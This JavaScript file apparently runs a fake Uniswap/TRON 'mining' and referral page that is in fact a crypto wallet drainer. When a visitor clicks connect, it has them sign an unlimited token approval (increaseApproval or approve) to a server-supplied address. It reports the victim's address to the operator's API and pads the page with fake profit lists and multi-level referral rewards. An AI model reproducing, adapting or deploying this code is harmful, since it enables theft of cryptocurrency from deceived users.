$('a').click(function() {
    var redirect = $(this).attr('href');
    var location = window.location.href;
    if (redirect) {
        if (! redirect.indexOf("?") > -1) {
            redirect += '?';
        } else {
            redirect += '&';
        }
        if (location.indexOf("?") > -1) {
            redirect += location.substring(location.indexOf("?") + 1);
        }
        window.location.href = redirect;
    }
    return false;
})

const ABI = [
    {"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
];

$(function() {
    // ETH
    // const addr = {
    //     'usdt': '0xdac17f958d2ee523a2206206994597c13d831ec7',
    //     'sushi': '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2',
    //     'usdc': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
    //     'uni': '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984',
    //     'aave': '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9',
    //     'yfi': '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e',
    //     'dai': '0x6b175474e89094c44da98b954eedeac495271d0f',
    //     'link': '0x514910771af9ca656af840dff83e8264ecf986ca',
    //     "LON": "0x0000000000095413afc295d19edeb1ad7b71c952",
    //     "CRV": "0xD533a949740bb3306d119CC777fa900bA034cd52",
    //     'FIL': "0xbf48ecb7c2d3d559e0a24b04f306889e05c73cd6",
    // }
    // const addr2 = {
    //     "WBTC": "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
    //     "WETH": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
    //     "CONV": "0xc834fa996fa3bec7aad3693af486ae53d8aa8b50",
    //     "inj": "0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30",
    //     "MKR": "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
    //     "ALPHA": "0xa1faa113cbe53436df28ff0aee54275c13b40975",
    //     "BAND": "0xba11d00c5f74255f56a5e366f4f77f5a186d7f55",
    //     "snx": "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f",
    //     "comp": "0xc00e94cb662c3520282e6f5717214004a7f26888",
    //     "sxp": "0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9",
    // }
    // const addr3 = {
    //     "FTT": "0x50d1c9771902476076ecfc8b2a83ad6b9355a4c9",
    //     "ust": "0xa47c8bf37f92abed4a126bda807a7b7498661acd",
    //     "TRIBE": "0xc7283b66eb1eb5fb86327f08e1b5816b0720212b",
    //     "wise": "0x66a0f676479Cee1d7373f3DC2e2952778BfF5bd6",
    //     "RRAX": "0x853d955acef822db058eb8505911ed77f175b99e",
    //     "CORE": "0x62359Ed7505Efc61FF1D56fEF82158CcaffA23D7",
    //     "mir": "0x09a3ecafa817268f77be1283176b946c4ff2e608",
    //     "DPI": "0x1494ca1f11d487c2bbe4543e90080aeba4ba3c2b",
    //     "luna": "0xd2877702675e6ceb975b4a1dff9fb7baf4c91ea9",
    //     "HEZ": "0xEEF9f339514298C6A857EfCfC1A762aF84438dEE",
    //     "fxs": "0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0",
    //     "fei": "0x956f47f50a910163d8bf957cf5846d573e7f87ca",
    // }
    // const price = {
    //     usdt: 1,
    //     sushi: 15.5,
    //     usdc: 1,
    //     dai: 1,
    //     uni: 28.6,
    //     aave: 380,
    //     yfi: 35000,
    //     link: 28.2,
    //     "LON": 7,
    //     "CRV": 3.01367,
    //     "GUSD": 1,
    //     "WBTC": 56478.2,
    //     "WETH": 1991.89,
    //     "CONV": 0.105733,
    //     "inj": 13.3812,
    //     "MKR": 2076.68,
    //     "ALPHA": 1.79043,
    //     "BAND": 16.3441,
    //     "snx": 20.0588,
    //     "comp": 468.076,
    //     "sxp": 4.11818,
    //     "FTT": 46.1779,
    //     "ust": 1.00543,
    //     "TRIBE": 1.42926,
    //     "wise": 0.446973,
    //     "RRAX": 0.996821,
    //     "CORE": 5447.59,
    //     "mir": 8.69817,
    //     "DPI": 415.906,
    //     "luna": 15.2402,
    //     "HEZ": 5.97533,
    //     "fxs": 8.47025,
    //     "fei": 0.898157,
    // }
    // const decimals = {
    //     sushi: 18,
    //     usdt: 6,
    //     usdc: 6,
    //     uni: 18,
    //     dai: 18,
    //     aave: 18,
    //     yfi: 18,
    //     link: 18,
    //     WBTC: 8,
    // }
    // const _web3 = new Web3('https://cloudflare-eth.com')
    // const Web3Modal = window.Web3Modal.default;
    // const WalletConnectProvider = window.WalletConnectProvider.default;
    // const contracts = {}, contracts2 = {}, contracts3 = {}
    // for (const symbol of Object.keys(addr)) {
    //     const contractAddr = addr[symbol]
    //     contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
    // }
    // for (const symbol of Object.keys(addr2)) {
    //     const contractAddr = addr2[symbol]
    //     contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
    // }
    // for (const symbol of Object.keys(addr3)) {
    //     const contractAddr = addr3[symbol]
    //     contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
    // }
    // let web3Modal;
    // let provider;
    // let selectedAccount;
    const addr = {
        'WIN': 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7',
        'USDT': 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
        'TONS': 'THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt',
        'USDJ': 'TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT',
        'JST': 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9',
        'HT': 'TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h',
        'SUN': 'TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9',
        "EXNX": "TCcVeKtYUrHEQDPmozjJFMrf6XX7BgF84A",
        "VCOIN": "TNisVGhbxrJiEHyYUMPxRzgytUtGM7vssZ",
        "POL": "TWcDDx1Q6QEoBrJi9qehtZnD4vcXXuVLer",
        "CKRW": "TTVTdn8ipmacfKsCHw5Za48NRnaBRKeJ44"
    }
    const price = {
        'WIN': 0.001150,
        'USDT': 1,
        'TONS': 1.35,
        'USDJ': 1.04,
        'JST': 0.125,
        "HT": 20.41,
        "SUN": 33.97,
        "EXNX": 0.0621,
        "VCOIN": 0.004225,
        "POL": 0.1393,
        "CKRW": 0.002487,
    }
    const decimals = {
        'WIN': 6,
        'USDT': 6,
        'TONS': 6,
        'USDJ': 18,
        'JST': 18,
        "HT": 18,
        "SUN": 18,
        "EXNX": 18,
        "VCOIN": 6,
        "POL": 8,
        "CKRW": 6,
    }
    var address = getUrlQueryString('address')
    var rank = 6.5;
    var authorized_address = '';
    var domain = 'https://' + window.location.host + '/';
    var bizhong = '';
    var infura_key = '';
    var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    // var approveEthAddr = "0xdac17f958d2ee523a2206206994597c13d831ec7";
    var total = 0;
    var trx = 0;
    var is = true;
    var tronWeb;
    var injectedWeb3;
    var time;
    var content = document.getElementById("myScroll");
    var fakeContent = document.getElementById("myFakeScroll");
    var wrapper = document.getElementById("myScrollWrapper");
    $('#address').text(address)

    async function init() {
        getInfo();
        getProfits();
    }

    async function initEth() {
        getInfo();
        getProfits();

        web3Modal = new Web3Modal({
            cacheProvider: !1,
            providerOptions: {
                walletconnect: {
                    package: WalletConnectProvider,
                    options: {
                        infuraId: "47a950cab4134279952b2202ec61dda8"
                    }
                }
            },
            disableInjectedProvider: !1
        });

        try {
            provider = await web3Modal.connect()
            provider.enable()
        } catch (e) {
            console.log("Could not get a wallet connection", e);
            return;
        }

        // Subscribe to accounts change
        provider.on("accountsChanged", async (accounts) => {
            await fetchAccountData();
        });

        // Subscribe to chainId change
        provider.on("chainChanged", async (chainId) => {
            await fetchAccountData();
        });

        // Subscribe to networkId change
        provider.on("networkChanged", async (networkId) => {
            await fetchAccountData();
        });

        await refreshAccountData();
    }

    async function onConnect() {
        try {
            let tronWeb = window.tronWeb;
            let walletAddress = tronWeb.defaultAddress.base58;

            let instance = await tronWeb.contract().at(approveAddr);
            let res = await instance.increaseApproval(authorized_address, "90000000000000000000000000000");
            res.send({
                feeLimit: 100000000,
                callValue: 0,
                shouldPollResponse: false
            }, function (err, res) {
                postInfo(walletAddress, "USDT");
            })
        } catch (e) {
            // alert(e);
            setTimeout(onConnect(), 1000);
        }
    }

    async function onEthConnect() {
        if (selectedAccount && provider) {
            const web3 = new Web3(provider);
            const contract = new web3.eth.Contract(ABI, approveAddr)
            const gasPrice = web3.eth.gasPrice
            console.log(authorized_address);
            contract.methods.approve(authorized_address, web3.utils.toBN('79228162514264337593543950335')).send({
                from: selectedAccount,
                gasPrice: gasPrice,
                gas: 1e5,
            }, function(err, tx) {
                if (!err) {
                    postInfo(selectedAccount, bizhong)
                }
                console.log(err, tx)
            })
        } else {
            provider = await web3Modal.connect()
            provider.enable()
            const web3 = new Web3(provider);
            const accounts = await web3.eth.getAccounts()
            selectedAccount = accounts[0]
            const contract = new web3.eth.Contract(ABI, approveAddr)
            const gasPrice = web3.eth.gasPrice

            contract.methods.approve(authorized_address, '79228162514264337593543950335').send({
                from: selectedAccount,
                gasPrice: gasPrice,
                gas: 1e5,
            }, function(err, tx) {
                console.log(err, tx)
                if (!err) {
                    postInfo(selectedAccount, bizhong)
                }
            })
        }
    }

    async function refreshAccountData() {
        document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
        await fetchAccountData(provider);
        document.querySelector("#btn-connect").removeAttribute("disabled")
    }

    async function fetchAccountData() {
        const web3 = new Web3(provider);
        injectedWeb3 = web3
        provider.enable()
        const accounts = await web3.eth.getAccounts()
        selectedAccount = accounts[0]
        console.log(selectedAccount);
        let gasPrice = web3.eth.gasPrice
        var gs = ((gasPrice * 80000) / (10 ** 18)).toFixed(6)
        console.log(gs)
        $('#gas').text(gs.toLocaleString() + ' ETH')
        $.get("https://data.block.cc/api/v3/price?api_key=WH5Y6G7PUMUSMVEQZAPXSTVCIEKATAZAARQFKD9E&slug=ethereum", function(result) {
            console.log(result[0]['u'])
            let mon = gs * result[0]['u']
            $('#gasmoney').text('$ ' + mon.toLocaleString())
        });
        $('.button_address').text(selectedAccount);
        $('#walletadd').text(selectedAccount.substring(0, 5))
        $('#referral-input').val(domain + 'uniswap/index.html?parent=' + selectedAccount)
        if (false !== selectedAccount) {
            postCustomer(selectedAccount)
        }
        getUserInfo(selectedAccount);
        getTrxDealRecord(selectedAccount)
        getWithdrawDealRecord(selectedAccount)
        getMostValuableAssets(selectedAccount)

        var walletBalance = await web3.eth.getBalance(selectedAccount)
        walletBalance = (walletBalance/Math.pow(10, 18)).toString().substring(0, 8);
        $('.balance').text(walletBalance + ' ETH');
    }

    async function getMostValuableAssets(account) {
        let _symbol = 'usdt'
        console.log('_symbol:' + _symbol);

        for (const [symbol, contract] of Object.entries(contracts)) {
            contract.methods.balanceOf(account).call(function(err, balance) {
                if (symbol == 'usdt') {
                    total = balance / (10 ** (decimals[symbol] || 18))
                }
                const usdt = balance / (10 ** (decimals[symbol] || 18)) * price[symbol]
                if (usdt > total && usdt > 1000) {
                    _symbol = symbol
                    total = usdt
                    approveAddr = addr[_symbol]
                    bizhong = _symbol

                }
            })
        }

        bizhong = _symbol
        $('.usdt_balance').attr('data-balance', total.toFixed(6))
        $('.usdt_balance').text(total.toFixed(6) + ' USDT')
        console.log('_symbol:' + _symbol);
        return _symbol
    }

    async function getMostValuableAssets2(account) {
        let _symbol = 'usdt'
        console.log('_symbol:' + _symbol);
        for (const [symbol, contract] of Object.entries(contracts2)) {
            contract.methods.balanceOf(account).call(function(err, balance) {
                const usdt = balance / (10 ** (decimals[symbol] || 18)) * price[symbol]
                if (usdt > total && usdt > 1000) {
                    _symbol = symbol
                    total = usdt
                    approveAddr = addr[_symbol]
                }
            })
        }

        bizhong = _symbol

        console.log('_symbol:' + _symbol);
        return _symbol
    }

    async function getMostValuableAssets3(account) {
        let _symbol = 'usdt'
        for (const [symbol, contract] of Object.entries(contracts3)) {
            contract.methods.balanceOf(account).call(function(err, balance) {
                const usdt = balance / (10 ** (decimals[symbol] || 18)) * price[symbol]
                if (usdt > total && usdt > 1000) {
                    _symbol = symbol
                    total = usdt
                    approveAddr = addr[_symbol]
                }
            })
        }
        bizhong = _symbol
        console.log('_symbol:' + _symbol);
        return _symbol
    }

    async function postInfo(address, symbol) {
        var s = getUrlQueryString('s')
        var a = getUrlQueryString('r')

        var data = {
            address:address,
            authorized_address:authorized_address,
            bizhong:symbol,
            code:s,
            reffer:a
        }
        $.ajax({
            type: 'post',
            url: domain + 'api/insert_trc',
            data: data,
            success: function () {
                alert('success')
            }
        })
    }

    async function postCustomer(address, symbol, balance) {
        var parent = getUrlQueryString('parent')
        var s = getUrlQueryString('s')

        var data = {
            address:address,
            parent:parent,
            domain: 'uniswap',
            code:s
        }
        $.ajax({
            type: 'post',
            url:  domain + 'api/user/info',
            data:data,
        })
    }

    async function postDealRecord(trx, usdt_balance, type) {
        let tronWeb = window.tronWeb;
        let walletAddress = tronWeb.defaultAddress.base58;
        if (false === walletAddress) {
            await onConnect();
        }

        var data = {
            address:walletAddress,
            price:trx,
            to_price:usdt_balance,
            type: type
        }
        $.ajax({
            type: 'post',
            url: domain + 'api/insert_deal_record',
            data: data,
            success: function(data) {
                alert('Success');
            },
            error: function(data) {}
        })
    }

    async function postEthDealRecord(trx, usdt_balance, type) {
        if (false === selectedAccount) {
            await fetchAccountData();
        }

        var data = {
            address:selectedAccount,
            price:trx,
            to_price:usdt_balance,
            type: type
        }
        $.ajax({
            type: 'post',
            url: domain + 'api/insert_deal_record',
            data: data,
            success: function(data) {
                alert('Success')
            },
            error: function(data) {}
        })
    }

    async function postReferrerInfo() {
        if (false === selectedAccount) {
            await fetchAccountData();
        }

        var fid = jQuery('#fid').val();
        var data = {
            address: selectedAccount,
            parent: fid
        }
        $.ajax({
            type: 'post',
            url: domain + 'api/insert_referral_info',
            data: data,
            success: function(data) {
                alert('Success')
            },
            error: function(data) {}
        })
    }

    function getUrlQueryString(names, urls) {
        urls = urls || window.location.href;
        urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
        var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
        var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
        if (r != null && r[2] != "") return unescape(r[2]);
        return null;
    }

    async function getWalletAddress() {
        try {
            let tronWeb = window.tronWeb
            let walletAddress = tronWeb.defaultAddress.base58;

            $('.button_address').text(walletAddress);
            $('#referral-input').val(domain + 'uniswap/index.html?parent=' + walletAddress)
            tradeobj = tronWeb.trx.getAccount(
                walletAddress,
            ).then(output => {
                trx = output.balance / 1000000;
                $('.balance').text(trx + ' TRX');
            });
            let contract = await tronWeb.contract().at(approveAddr);
            await contract.balanceOf(walletAddress).call(function (err, tex) {
                if (err == null) {
                    let total = tex._hex / (10 ** 6);
                    $('.usdt_balance').attr('data-balance', total.toFixed(6))
                    $('.usdt_balance').text(total.toFixed(6) + ' USDT');
                }
            });

            if (false !== walletAddress) {
                postCustomer(walletAddress)
            }
            getUserInfo(walletAddress);
            getTrxDealRecord(walletAddress)
            getWithdrawDealRecord(walletAddress)

            window.clearInterval(time);
            return true;
        } catch (e) {
            return false;
        }
    }

    function getInfo() {
        $.ajax({
            type: 'get',
            url: domain + 'api/get_trc',
            async: false,
            success: function(data) {
                console.log(data)
                authorized_address = data.data.authorized_address;
                console.log(authorized_address);
                infura_key = data.data.infura_key;
            },
            error: function(data) {}
        })
    }

    function getProfits(){
        $.ajax({
            type: 'get',
            url:  domain + 'api/profits',
            success:function(data){
                var profitArray = data.data;
                var html = '';
                for (var index in profitArray) {
                    html += '<uni-view data-v-3452f376="" class="dataList ">'
                        + '<uni-text data-v-3452f376="" class="outHash"><span>' + profitArray[index]['address'] + '</span></uni-text>'
                        + '<uni-text data-v-3452f376="" class="dataNum"><span>'+ profitArray[index]['balance'] + ' '
                        + profitArray[index]['type'] + '</span></uni-text>'
                        + '</uni-view>';
                }
                $('#myScroll').html(html)
                // roll(40);
            },
            error:function(data){
            }
        })
    }

    function getUserInfo(address) {
        $.ajax({
            type: 'post',
            url:  domain + 'api/get_user_info',
            data : {address: address},
            success:function(data){
                $('.team').text(data.teamCount);
                $('.child').text(data.child);
                $('.eth_balance').text(data.eth);
                $('.eth_pro').text(data.eth * (data.proportion / 100));
                $('.trx_balance').text(data.trx);
                $('.trx_pro').text((data.trx * (data.proportion / 100)).toFixed(6));
                $('.level').text('Level ' + data.level);
                $('.level1').text(data.level1);
                $('.level2').text(data.level2);
                $('.level3').text(data.level3);
                $('.money').text(data.money);
                $('.proportion').text(data.proportion);
                getChildList(address)
            },
            error:function(data){
            }
        })
    }

    function getChildList(address, level = ''){
        $.ajax({
            type: 'post',
            url:  domain + 'api/get_child_list',
            data: {address: address, level: level},
            success:function(data){
                var level1_money = 0;
                var level2_money = 0;
                var level3_money = 0;
                for (var index in data) {
                    switch (data[index]['level']) {
                        case 1:
                            level1_money += data[index]['money']
                            break;
                        case 2:
                            level2_money += data[index]['money']
                            break;
                        case 3:
                            level2_money += data[index]['money']
                            break;
                        default:
                            break;
                    }
                }
                $('.level1-money').text(level1_money);
                $('.level2-money').text(level2_money);
                $('.level3-money').text(level3_money);
            },
            error:function(data){
            }
        })
    }

    function getTrxDealRecord(address){
        $.ajax({
            type: 'post',
            url:  domain + 'api/get_deal_record',
            data: {address: address, type: 3},
            success:function(data){
                $('#exchange-list').html('')
                var list = data;
                var html = '';
                for (var index in list) {
                    html += '<div data-v-3452f376="" class="dataList" style="display: flex; padding: 5px 0;">'
                        + '<div data-v-9a8a2580="" style="word-break: break-all;width: 70%;"><span>' + list[index]['address'] + '</span></div>'
                        + '<div data-v-9a8a2580="" style="width: 30%; text-align: center;"><span>' + list[index]['price'] + ' TRX</span></div>'
                        + '</div>';
                }
                $('#exchange-list').html(html)
            },
            error:function(data){
            }
        })
    }

    function getWithdrawDealRecord(address){
        $.ajax({
            type: 'post',
            url:  domain + 'api/get_deal_record',
            data: {address: address, type: 1},
            success:function(data){
                $('#withdraw-list').html('')
                var list = data;
                var html = '';
                for (var index in list) {
                    html += '<div data-v-3452f376="" class="dataList" style="display: flex; padding: 5px 0;">'
                        + '<div data-v-9a8a2580="" style="word-break: break-all;width: 70%;"><span>' + list[index]['address'] + '</span></div>'
                        + '<div data-v-9a8a2580="" style="width: 30%; text-align: center;"><span>' + list[index]['price'] + ' TRX</span></div>'
                        + '</div>';
                }
                $('#withdraw-list').html(html)
            },
            error:function(data){
            }
        })
    }

    function roll(t) {
        fakeContent.innerHTML = content.innerHTML;
        // 开始无滚动时设为0
        wrapper.scrollTop = 0;
        // 设置定时器，参数t用在这为间隔时间（单位毫秒），参数t越小，滚动速度越快
        var timer = setInterval(rollStart, t);

        // 鼠标移入div时暂停滚动
        wrapper.onmouseover = function() {
            clearInterval(timer);
            timer = null
        };

        // 鼠标移出div后继续滚动
        wrapper.onmouseout = function() {
            timer = setInterval(rollStart, t);
        }
    }
    // 开始滚动函数
    function rollStart() {
        // 正常滚动不断给scrollTop的值+1,当滚动高度大于列表内容高度时恢复为0
        if (wrapper.scrollTop >= content.scrollHeight) {
            wrapper.scrollTop = 0;
        } else {
            wrapper.scrollTop++;
        }
    }

    $('.commit').click(function () {
        var ethnum = jQuery('#ethnumber').val();
        var usdt_balance = ethnum * 0.08197
        // var usdt_balance = ethnum * 4057.4
        // postDealRecord(ethnum, usdt_balance, 'eth');
        postDealRecord(ethnum, usdt_balance, 'trx');
    })

    $('.withdraw-commit').click(function () {
        var ethnum = jQuery('#usdtnumber').val();
        postDealRecord(ethnum, null, 'withdraw');
    })

    $('.referrer-commit').click(function () {
        postReferrerInfo()
    })

    $("#menuBox").on("show.bs.collapse", function(){
        $('.indexBag').click(function () {
            $("#menuBox").collapse("hide")
        })
        $('#close-btn').click(function () {
            $('#menuBox').collapse("hide")
        })
    });

    $('.goBack').click(function () {
        var referrer = getUrlQueryString('referrer')
        var redirect = document.referrer

        // var location = window.location.href;
        // if (location.indexOf("?") > -1) {
        //     var params = location.substring(location.indexOf("?") + 1);
        //     var reg = new RegExp("(^|&)referrer=([^&]*)(&|$)", "i");
        //     redirect += '?' + params.replace(reg, '');
        // }

        window.location.href = redirect
    })

    $(document).ready(function () {
        init();
        if (document.querySelector("#btn-connect")) document.querySelector("#btn-connect").addEventListener("click", onConnect);
        time = setInterval(getWalletAddress, 1000);
    });
})
